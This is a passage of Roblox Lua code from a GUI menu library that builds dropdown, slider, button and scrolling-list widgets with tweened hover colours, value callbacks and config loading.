											Button.Size = C.UDIM2(0, 175, 0, 17) 
											Button.AutoButtonColor = false 
											Button.Font = Enum.Font.SourceSans 
											Button.Text = "" 
											Button.TextColor3 = C.COL3RGB(0, 0, 0) 
											Button.TextSize = 11.000
											Button.BorderSizePixel = 0 
											Button.ZIndex = 6 

											TextLabel.Parent = Button 
											TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
											TextLabel.BackgroundTransparency = 1.000 
											TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
											TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
											TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
											TextLabel.Font = Enum.Font.Gotham 
											TextLabel.Text = v 
											TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											TextLabel.TextSize = 11.000
											TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
											TextLabel.ZIndex = 6 

											Button.MouseButton1Down:Connect(function() 
												Drop.Visible = false 
												Element.value.Dropdown = v 
												abcd.Text = v 
												values[tabname][sectorname][tabtext][text] = Element.value 
												callback(Element.value) 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end) 
											Button.MouseEnter:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  MainUIColor}) 
											end) 
											Button.MouseLeave:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
											end) 

											first = false 
										end 
									end 

									function Element:SetValue(val) 
										Element.value = val 
										abcd.Text = val.Dropdown 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(val) 
									end 

									ImageLabel.Parent = Button 
									ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ImageLabel.BackgroundTransparency = 1.000 
									ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
									ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
									ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

									TextLabel_3.Parent = Dropdown 
									TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel_3.BackgroundTransparency = 1.000 
									TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
									TextLabel_3.Font = Enum.Font.Gotham 
									TextLabel_3.Text = text 
									TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.TextSize = 11.000
									TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

									Button.MouseButton1Down:Connect(function() 
										Drop.Visible = not Drop.Visible 
										if not Drop.Visible then 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end) 
									local indrop = false 
									local ind = false 
									Drop.MouseEnter:Connect(function() 
										indrop = true 
									end) 
									Drop.MouseLeave:Connect(function() 
										indrop = false 
									end) 
									Button.MouseEnter:Connect(function() 
										ind = true 
									end) 
									Button.MouseLeave:Connect(function() 
										ind = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if Drop.Visible == true and not indrop and not ind then 
												Drop.Visible = false 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end 
										end 
									end) 
									values[tabname][sectorname][tabtext][text] = Element.value 
									
									
									
									
									
					
									
									
									
									
									
									
								elseif type == "Slider" then 

									tabsize = tabsize + C.UDIM2(0,0,0,25) 

								local Slider = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 
								local Button = C.INST("TextButton") 
								local Frame = C.INST("Frame") 
								local UIGradient = C.INST("UIGradient") 
								local Value = C.INST("TextLabel") 

								Slider.Name = "Slider" 
								Slider.Parent = tab1 
								Slider.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Slider.BackgroundTransparency = 1.000 
								Slider.Position = C.UDIM2(0, 0, 0.653061211, 0) 
								Slider.Size = C.UDIM2(1, 0, 0, 25) 

								TextLabel.Parent = Slider 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -2) 
								TextLabel.Size = C.UDIM2(0, 100, 0, 15) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								Button.Name = "Button" 
								Button.Parent = Slider 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 15) 
								Button.Size = C.UDIM2(0, 175, 0, 5) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Frame.Parent = Button 
								Frame.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Frame.BorderSizePixel = 0 
								Frame.Size = C.UDIM2(0.5, 0, 1, 0) 
								
								UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, MainUIColor), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
								
								
								UIGradient.Rotation = 90
								UIGradient.Parent = Frame


								Value.Name = "Value" 
								Value.Parent = Slider 
								Value.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Value.BackgroundTransparency = 1.000 
								Value.Position = C.UDIM2(0, 30, 0, 15) 
								Value.Size = C.UDIM2(0, 175, 0, 5)  
								Value.Font = Enum.Font.Gotham 
								Value.Text = "50" 
								Value.TextStrokeTransparency = 0.000
								Value.TextColor3 = C.COL3RGB(200, 200, 200) 
								Value.TextSize = 11.000 
								local min, max, default = data.min or 0, data.max or 100, data.default or 0 
								Element.value = {Slider = default} 

								function Element:SetValue(value) 
									Element.value = value 
									local a 
									if min > 0 then 
										a = ((Element.value.Slider - min)) / (max-min) 
									else 
										a = (Element.value.Slider-min)/(max-min) 
									end 
									Value.Text = Element.value.Slider 
									Frame.Size = C.UDIM2(a,0,1,0) 
									values[tabname][sectorname][tabtext][text] = Element.value 
									callback(value) 
								end 
								local a 
								if min > 0 then 
									a = ((Element.value.Slider - min)) / (max-min) 
								else 
									a = (Element.value.Slider-min)/(max-min) 
								end 
								Value.Text = Element.value.Slider 
								Frame.Size = C.UDIM2(a,0,1,0) 
								values[tabname][sectorname][tabtext][text] = Element.value 
								local uis = game:GetService('UserInputService')
								local mouse = game.Players.LocalPlayer:GetMouse() 
								local val 
								Button.MouseButton1Down:Connect(function() 
									Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
									val = (((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min) or 0 
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
											--print(val)
											--print(typeof(val))
										end									
									Value.Text = val 
									Element.value.Slider = val
									values[tabname][sectorname][tabtext][text] = Element.value 
									callback(Element.value) 
									moveconnection = mouse.Move:Connect(function() 
										Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
										val = (((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min) 
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
										end
											--print(val)
											--print(typeof(val))
																					
										Value.Text = val 
										Element.value.Slider = val 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end) 
									releaseconnection = uis.InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
											val = (((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min)
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
										end
											--print(val)
											--pri
											values[tabname][sectorname][tabtext][text] = Element.value 
											callback(Element.value) 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end)
								end)
								elseif type == "Button" then 

									tabsize = tabsize + C.UDIM2(0,0,0,24) 
									local Button = C.INST("Frame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 

									Button.Name = "Button" 
									Button.Parent = tab1 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Position = C.UDIM2(0, 0, 0.236059487, 0) 
									Button.Size = C.UDIM2(1, 0, 0, 24) 

									Button_2.Name = "Button" 
									Button_2.Parent = Button 
									Button_2.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button_2.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button_2.Position = C.UDIM2(0, 30, 0.5, -9) 
									Button_2.Size = C.UDIM2(0, 175, 0, 18) 
									Button_2.AutoButtonColor = false 
									Button_2.Font = Enum.Font.SourceSans 
									Button_2.Text = "" 
									Button_2.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button_2.TextSize = 11.000

									TextLabel.Parent = Button_2 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Size = C.UDIM2(1, 0, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000

									function Element:SetValue() 
									end 

									Button_2.MouseButton1Down:Connect(function() 
										TextLabel.TextColor3 = MainUIColor 
										library:Tween(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										local lmfaooo, lol = pcall(function()
										callback(TextLabel, TextLabel.Text)
											end)
										if lmfaooo then
										TextLabel.Text = 'Success!'
										wait(1)
										TextLabel.Text = text
										else 
										TextLabel.Text = 'Error!'
										wait(1)
										TextLabel.Text = text
										print(lol)
										end
									end) 
									Button_2.MouseEnter:Connect(function() 
										library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									end) 
									Button_2.MouseLeave:Connect(function() 
										library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end) 
								end 
								ConfigLoad:Connect(function(cfg) 
									local fix = library:ConfigFix(cfg) 
									if fix[tabname][sectorname][tabtext][text] ~= nil then 
										Element:SetValue(fix[tabname][sectorname][tabtext][text]) 
									end 
								end)
								ConfigLoad1:Connect(function(cfg)
									local fix = library:ConfigFix1(cfg) 
									if fix[tabname][sectorname][tabtext][text] ~= nil then 
										Element:SetValue(fix[tabname][sectorname][tabtext][text]) 
									end 
								end)

								return Element 
							end 


							if firs then 
								coroutine.wrap(function() 
									game:GetService('RunService').RenderStepped:Wait() 
									Section.Size = tabsize 
								end)() 
								selected = text 
								TextButton.TextColor3 = C.COL3RGB(255,255,255) 
								tab1.Visible = true 
								firs = false 
							end 

							return tab 
						end 
						library.tabs[tabname][sectorname] = MSector
						return MSector 
					end 
					function Tab:Sector(text, side) 
						local sectorname = text 
						local Sector = {} 
						values[tabname][text] = {} 
						local Section = C.INST("Frame") 
						local SectionText = C.INST("TextLabel") 
						local Inner = C.INST("Frame") 
						local UIListLayout = C.INST("UIListLayout") 

						Section.Name = "Section" 
						Section.Parent = TabGui[side] 
						Section.BackgroundColor3 = C.COL3RGB(18, 18, 16) 
						Section.BorderColor3 = C.COL3RGB(18, 18, 16) 
						Section.BorderSizePixel = 0 
						Section.Position = C.UDIM2(0.00358422939, 0, 0, 0) 
						Section.Size = C.UDIM2(1, 0, 0, 22) 

						SectionText.Name = "SectionText" 
						SectionText.Parent = Section 
						SectionText.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
						SectionText.BackgroundTransparency = 1.000 
						SectionText.Position = C.UDIM2(0, 7, 0, -12) 
						SectionText.Size = C.UDIM2(0, 270, 0, 19) 
						SectionText.ZIndex = 2 
						SectionText.Font = Enum.Font.Gotham 
						SectionText.Text = text 
						SectionText.TextColor3 = C.COL3RGB(255, 255, 255) 
						SectionText.TextSize = 12.000 
						SectionText.TextXAlignment = Enum.TextXAlignment.Left 

						Inner.Name = "Inner" 
						Inner.Parent = Section 
						Inner.BackgroundColor3 = C.COL3RGB(30, 30, 30) 
						Inner.BorderColor3 = C.COL3RGB(18, 18, 16) 
						Inner.BorderSizePixel = 0 
						Inner.Position = C.UDIM2(0, 1, 0, 1) 
						Inner.Size = C.UDIM2(1, -2, 1, -2) 

						local UIPadding = C.INST("UIPadding") 

						UIPadding.Parent = Inner 
						UIPadding.PaddingTop = UDim.new(0, 10) 

						UIListLayout.Parent = Inner 
						UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
						UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
						UIListLayout.Padding = UDim.new(0,1) 

						function Sector:Element(type, text, data, callback) 
							local Element = {} 
							data = data or {} 
							callback = callback or function() end 
							values[tabname][sectorname][text] = {} 
							if type == "ScrollDrop" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,39) 
								Element.value = {Scroll = {}, Dropdown = "",UpdateValue = {}} 

								for i,v in pairs(data.options) do 
									Element.value.Scroll[i] = v[1] 
								end 

								local joe = {} 
								if data.alphabet then 
									local copy = {} 
									for i,v in pairs(data.options) do 
										C.INSERT(copy, i) 
									end 
									C.TBLSORT(copy, function(a,b) 
										return a < b 
									end) 
									joe = copy 
								else 
									for i,v in pairs(data.options) do 
										C.INSERT(joe, i) 
									end 
								end 

								local amount = data.Amount or 6 
								
								local Dropdown = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 
								local Drop = C.INST("ScrollingFrame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel_2 = C.INST("TextLabel") 
								local UIListLayout = C.INST("UIListLayout") 
								local ImageLabel = C.INST("ImageLabel") 
								local TextLabel_3 = C.INST("TextLabel") 

								Dropdown.Name = "Dropdown" 
								Dropdown.Parent = Inner 
								Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Dropdown.BackgroundTransparency = 1.000 
								Dropdown.Position = C.UDIM2(0, 0, 0, 0) 
								Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

								Frame = C.INST('Frame')
								Frame.Size = C.UDIM2(0, 0, 0, amount * 16 + 8) 
								Frame.BorderSizePixel = 0
								--Frame.Visible = false
								Frame.Parent = Inner
								
								Button.Name = "Button" 
								Button.Parent = Dropdown 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 16) 
								Button.Size = C.UDIM2(0, 175, 0, 17) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								local TextLabel = C.INST("TextLabel") 

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
								TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = "lol" 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local abcd = TextLabel 

								Drop.Name = "Drop" 
								Drop.Parent = Button 
								Drop.Active = true 
								Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Drop.Position = C.UDIM2(0, 0, 1, 1) 
								Drop.Size = C.UDIM2(1, 0, 0, 20) 
								Drop.Visible = false 
								Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Drop.ScrollBarThickness = 4 
								Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.AutomaticCanvasSize = "Y" 
								Drop.ZIndex = 5 
								Drop.ScrollBarImageColor3 = MainUIColor 
								function MenuAccent(color)
									Drop.ScrollBarImageColor3 = color
								end

								UIListLayout.Parent = Drop 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 


								
								Section.Size = Section.Size + C.UDIM2(0,0,0,amount * 16 + 8) 

								local num = #joe 
								if num > 5 then 
									Drop.Size = C.UDIM2(1, 0, 0, 85) 
								else 
									Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
								end 
								local first = true 
								for i,v in ipairs(joe) do 
									do 
										local joell = v 
										local Scroll = C.INST("Frame") 
										local joe2 = data.options[v] 
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Drop 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(0, 175, 0, 17) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000
										Button.BorderSizePixel = 0 
										Button.ZIndex = 6 

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
										TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										TextLabel.ZIndex = 6 

										Button.MouseButton1Down:Connect(function() 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
											abcd.Text = v 
											for i,v in pairs(Scroll.Parent:GetChildren()) do 
												if v:IsA("Frame") then 
													v.Visible = false 
												end 
											end 
											Element.value.Dropdown = v 
											Scroll.Visible = true 
											callback(Element.value) 
										end) 
										Button.MouseEnter:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
										end) 
										Button.MouseLeave:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
										end) 

										if first then 
											abcd.Text = v 
											Element.value.Dropdown = v 
										end 
										local Frame = C.INST("ScrollingFrame") 
										local UIListLayout = C.INST("UIListLayout") 

										Scroll.Name = "Scroll" 
										Scroll.Parent = Dropdown 
										Scroll.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										Scroll.BackgroundTransparency = 1.000 
										Scroll.Position = C.UDIM2(0, 0, 0, 0) 
										Scroll.Size = C.UDIM2(1, 0, 0, amount * 16 + 8) 
										Scroll.Visible = first 
										Scroll.Name = v 


										Frame.Name = "Frame"
										Frame.Parent = Scroll 
										Frame.Active = true 
										Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Frame.Position = C.UDIM2(0, 30, 0, 40) 
										Frame.Size = C.UDIM2(0, 175, 0, 16 * amount) 
										Frame.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
										Frame.CanvasSize = C.UDIM2(0, 0, 0, 0) 
										Frame.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
										Frame.ScrollBarThickness = 4 
										Frame.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
										Frame.AutomaticCanvasSize = "Y" 
										Frame.ScrollBarImageColor3 = MainUIColor 
								function MenuAccent(color)
									Frame.ScrollBarImageColor3 = color
								end
										UIListLayout.Parent = Frame 
										UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
										UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
										local joll = true 
										updatescroll = function(value)
											for i,v in pairs(Frame:GetChildren()) do
												if v:IsA('TextButton') then
													v:Destroy()
												end
											end
											for i,v1 in ipairs(value) do 
												local Button = C.INST("TextButton") 
												local TextLabel = C.INST("TextLabel") 

												Button.Name = v1
												
												
												Button.Parent = Frame 
												Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
												Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
												Button.BorderSizePixel = 0 
												Button.Position = C.UDIM2(0, 30, 0, 16) 
												Button.Size = C.UDIM2(1, 0, 0, 16) 
												Button.AutoButtonColor = false 
												Button.Font = Enum.Font.SourceSans 
												Button.Text = "" 
												Button.TextColor3 = C.COL3RGB(0, 0, 0) 
												Button.TextSize = 11.000

												TextLabel.Parent = Button 
												TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
												TextLabel.BackgroundTransparency = 1.000 
												TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
												TextLabel.Position = C.UDIM2(0, 4, 0, -1) 
												TextLabel.Size = C.UDIM2(1, 1, 1, 1) 
												TextLabel.Font = Enum.Font.Gotham 
												TextLabel.Text = v1 
												TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
												TextLabel.TextSize = 11.000
												TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
												
												if joll then 
													joll = false 
													TextLabel.TextColor3 = MainUIColor
												end 

												Button.MouseButton1Down:Connect(function() 

													for i,v in pairs(Frame:GetChildren()) do 
														if v:IsA("TextButton") then 
															library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
														end 
													end 

													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 

													Element.value.Scroll[joell] = v1

													values[tabname][sectorname][text] = Element.value 
													callback(Element.value) 
												end) 
												Button.MouseEnter:Connect(function() 
													if Element.value.Scroll[joell] ~= v1 then 
														library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
													end 
												end) 
												Button.MouseLeave:Connect(function() 
													if Element.value.Scroll[joell] ~= v1 then 
														library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
													end 
												end) 
												
											end 
										end
										updatescroll(joe2)
										Element.value.UpdateValue[v] = updatescroll

										first = false 
									end 
								end 

								ImageLabel.Parent = Button 
								ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ImageLabel.BackgroundTransparency = 1.000 
								ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
								ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
								ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

								TextLabel_3.Parent = Dropdown 
								TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel_3.BackgroundTransparency = 1.000 
								TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
								TextLabel_3.Font = Enum.Font.Gotham 
								TextLabel_3.Text = text 
								TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel_3.TextSize = 11.000
								TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

								Button.MouseButton1Down:Connect(function() 
									Drop.Visible = not Drop.Visible 
									if not Drop.Visible then 
										Drop.CanvasPosition = C.Vec2(0,0) 
									end 
								end) 
								local indrop = false 
								local ind = false 
								Drop.MouseEnter:Connect(function() 
									indrop = true 
								end) 
								Drop.MouseLeave:Connect(function() 
									indrop = false 
								end) 
								Button.MouseEnter:Connect(function() 
									ind = true 
								end) 
								Button.MouseLeave:Connect(function() 
									ind = false 
								end) 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if Drop.Visible == true and not indrop and not ind then 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end 
								end) 

								function Element:SetValue(tbl) 
									Element.value = tbl 
									abcd.Text = tbl.Dropdown 
									values[tabname][sectorname][text] = Element.value 
									for i,v in pairs(Dropdown:GetChildren()) do 
										if v:IsA("Frame") then 
											if v.Name == Element.value.Dropdown then 
												v.Visible = true 
											else 
												v.Visible = false 
											end 
											for _,bad in pairs(v.Frame:GetChildren()) do 
												if bad:IsA("TextButton") then 
													bad.TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
													if bad.Name == Element.value.Scroll[v.Name] then 
														bad.TextLabel.TextColor3 = MainUIColor 
														function MenuAccent(color)
															bad.TextLabel.TextColor3 = color
														end
													end 
												end 
											end 
										end 
									end 
								end 

								if data.default then 
									Element:SetValue(data.default) 
								end 

								values[tabname][sectorname][text] = Element.value 

							elseif type == "Scroll" then 
								local amount = data.Amount or 6 
								Section.Size = Section.Size + C.UDIM2(0,0,0,amount * 16 + 8) 
								if data.alphabet then 
									C.TBLSORT(data.options, function(a,b) 
										return a < b 
									end) 
								end 
								Element.value = {Scroll = data.default and data.default.Scroll or data.options[1]} 

								local Scroll = C.INST("Frame") 
								local Frame = C.INST("ScrollingFrame") 
								local UIListLayout = C.INST("UIListLayout") 

								Scroll.Name = "Scroll" 
								Scroll.Parent = Inner 
								Scroll.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Scroll.BackgroundTransparency = 1.000 
								Scroll.Position = C.UDIM2(0, 0, 00, 0) 
								Scroll.Size = C.UDIM2(1, 0, 0, amount * 16 + 8) 


								Frame.Name = "Frame" 
								Frame.Parent = Scroll --  
								Frame.Active = true 
								Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Frame.Position = C.UDIM2(0, 30, 0, 0) 
								Frame.Size = C.UDIM2(0, 175, 0, 16 * amount) 
								Frame.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Frame.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.ScrollBarThickness = 4 
								Frame.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.AutomaticCanvasSize = "Y" 
								Frame.ScrollBarImageColor3 = MainUIColor 
														function MenuAccent(color)
															Frame.ScrollBarImageColor3 = color
														end
								UIListLayout.Parent = Frame 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
								local first = true 
								for i,v in ipairs(data.options) do 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 

									Button.Name = v 
									Button.Parent = Frame 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.BorderSizePixel = 0 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(1, 0, 0, 16) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 4, 0, -1) 
									TextLabel.Size = C.UDIM2(1, 1, 1, 1) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = v 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
